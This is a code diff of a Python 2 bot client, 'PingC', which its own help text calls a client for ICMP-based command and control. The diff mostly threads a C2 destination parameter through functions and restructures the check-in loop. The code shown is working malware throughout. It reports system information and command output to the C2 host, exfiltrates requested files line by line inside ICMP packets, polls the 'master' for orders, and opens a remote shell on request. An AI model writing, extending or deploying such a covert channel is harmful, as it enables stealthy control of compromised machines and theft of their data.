@@ -14,6 +14,7 @@ import signal
 import subprocess as sub
 from ConfigParser import SafeConfigParser
 from optparse import OptionParser
+import argparse
 from scapy.all import *
 import select
 from impacket import ImpactDecoder
@@ -205,7 +206,7 @@ def getId():
 
 def setId(botId):
 	conf_file = 'conf/pingc.conf'
-	#print "[D] Writing bot Id: ",botId
+	print "[D] Writing bot Id: ",botId
 	cp = SafeConfigParser()
         cp.optionxform = str # Preserves case sensitivity
         cp.readfp(open(conf_file, 'r'))
@@ -222,13 +223,14 @@ def active():
         cp.optionxform = str # Preserves case sensitivity
         cp.readfp(open(conf_file, 'r'))
         section = 'Main'
-        return cp.get(section,'checkedin')
+        printLine("[D] checking pingc.conf for checkedin",flag)
+	return cp.get(section,'checkedin')
 
 def handler(signum, frame):
         print 'Bye!'
         sys.exit()
 
-def sendFile(filename,botId):
+def sendFile(dest,filename,botId):
 	printLine( "[*] Sending file: %s" % (filename),flag)
 	try:
 		file = open(filename, 'r')
@@ -237,28 +239,28 @@ def sendFile(filename,botId):
 		return
 	startLine = '(FILE_START) ' + botId + ' ' + str(filename)
 	printLine("[D] Startline: %s" % (startLine),flag)
-	packet=IP(dst=sys.argv[1])/ICMP()/startLine
+	packet=IP(dst=dest)/ICMP()/startLine
 	p=sr1(packet,timeout=1)
 	for line in file:
 		printLine( "[D] Sending line: %s" % (line),flag)
 		sendLine = '(FILE) ' + botId + ' ' + filename + ' ' + line
-		packet=IP(dst=sys.argv[1])/ICMP()/sendLine
+		packet=IP(dst=dest)/ICMP()/sendLine
 		#send(packet)
 		#time.sleep(1)
 		p=sr1(packet,timeout=1)
 	printLine( "[D] End of file",flag)
 	finishLine = '(FILE_END) ' + botId + ' ' + str(filename)
-	packet=IP(dst=sys.argv[1])/ICMP()/finishLine
+	packet=IP(dst=dest)/ICMP()/finishLine
 	send(packet)
 
 	
-def sendPingRequest(request,botId):
+def sendPingRequest(dest,request,botId):
 	full_request = request + ' ' + str(botId)
 	if botId == '123456789':
 		# Initial Checkin request
-		packet=IP(dst=sys.argv[1])/ICMP()/str(request)
+		packet=IP(dst=dest)/ICMP()/str(request)
 	else:
-		packet=IP(dst=sys.argv[1])/ICMP()/str(full_request)
+		packet=IP(dst=dest)/ICMP()/str(full_request)
         #packet.show()
         #print "[*] Request sent to C2 server: " + request
 	try:
@@ -271,9 +273,10 @@ def sendPingRequest(request,botId):
         except:
 		printLine( "[X] Error receiving packet",flag)
 
-def processReply(p):
+def processReply(dest,p):
 	try:
 		response=p['Raw'].load
+		printLine("[D] Response: %s" % response, flag)
         except:
 		print "[X] Error: ", sys.exc_info()[0]
 		return
@@ -293,9 +296,11 @@ def processReply(p):
                 output, errors = proc.communicate()
                 botId=getId()
 		sendRequest = 'sysinfo %s %s' % (botId,output)
-		p=sendPingRequest(sendRequest, botId)
+		p=sendPingRequest(dest,sendRequest, botId)
 		if p:	
-			processReply(p)
+			processReply(dest,p)
+		else:
+			printLine("[D] No Reply found",flag)
 		printLine(output,flag)
                 printLine( errors,flag)
 	elif 'Thanks' in response:
@@ -307,7 +312,7 @@ def processReply(p):
 		botId=getId()
 		printLine( "[D] filesSent: %s" % (str(filesSent)),flag)
 		if response[4:] not in filesSent:
-			sendFile(response[4:], botId)
+			sendFile(dest,response[4:], botId)
 			filesSent.append(response[4:])
 		else:
 			printLine( "[*] File already sent...skipping",flag)
@@ -323,50 +328,49 @@ def processReply(p):
 	elif 'shell' in response:
 		printLine( "[*] Master wants shell, master gets shell",flag)
 		time.sleep(10)
-		pingshell(sys.argv[1])
+		pingshell(dest)
 
-def main(argv):
+def main(dest,flag):
 	global filesSent
-	global flag
 	filesSent = []
-	flag = 0
 	
-	parser = OptionParser(usage="%prog [-d] <Server IP>")
-        parser.add_option("-d", "--debug", help="add debug statements (1 for standard, 2 for more)",metavar="LEVEL")
-        (options, args) = parser.parse_args()
-        if options.debug:
-		flag = options.debug
+	#parser = OptionParser(usage="%prog [-d] <Server IP>")
+        #parser.add_option("-d", "--debug", help="add debug statements (1 for standard, 2 for more)",metavar="LEVEL")
+        #(options, args) = parser.parse_args()
+        #if options.debug:
+	#	flag = options.debug
        	 
 	printLine("--------------------------------------------",flag)
         printLine("PingC.py started on %s" % (date.today()),flag)
         printLine("--------------------------------------------",flag)
         printLine("[D] flag=%s" % (flag),flag)
-
-	if int(active()) != 1:
-		printLine("[*] Not checked in...checking in now",flag)
-		proc = sub.Popen(['uname -a'],stdout=sub.PIPE,stderr=sub.PIPE,shell=True)
-                output, errors = proc.communicate()
-                p=sendPingRequest('Checkin %s' % output,'123456789')
-                if p:
-                        processReply(p)
-                printLine(output,flag)
-                printLine(errors,flag)
-		printLine("[D] id==null",flag)
 	while True:
-		if len(argv) < 1:
-			print "----------------------------"
-			print "PingC Usage"
-			print " ./pingc.py <IP>"
-			print "----------------------------"
-			exit()
 		signal.signal(signal.SIGINT, handler)
+		if int(active()) != 1:
+			printLine("[*] Not checked in...checking in now",flag)
+			proc = sub.Popen(['uname -a'],stdout=sub.PIPE,stderr=sub.PIPE,shell=True)
+                	output, errors = proc.communicate()
+                	p=sendPingRequest(dest,'Checkin %s' % output,'123456789')
+                	if p:
+                        	processReply(dest,p)
+                	printLine(output,flag)
+                	printLine(errors,flag)
+			printLine("[D] id==null",flag)
+			pass
 		id = getId()
 		sendStr="What shall I do master?"
-		p=sendPingRequest(sendStr, id)
+		p=sendPingRequest(dest,sendStr, id)
 		if p:
-			processReply(p)
+			processReply(dest,p)
 		getSleep()
 
 if __name__ == "__main__":
-   main(sys.argv[1:])
+  global flag
+  parser = argparse.ArgumentParser(version="%prog 1.0",description="Pingc client for icmp based C2")
+  parser.add_argument('dest', help='Destination IP or hostname for C2', metavar='DEST') 
+  parser.add_argument("-d", "--debug", dest='debug', help="debug level 1-2", metavar="DEBUG", default=0)
+  args = parser.parse_args()
+  if args.debug:
+  	flag = args.debug
+  main(args.dest,flag)
 
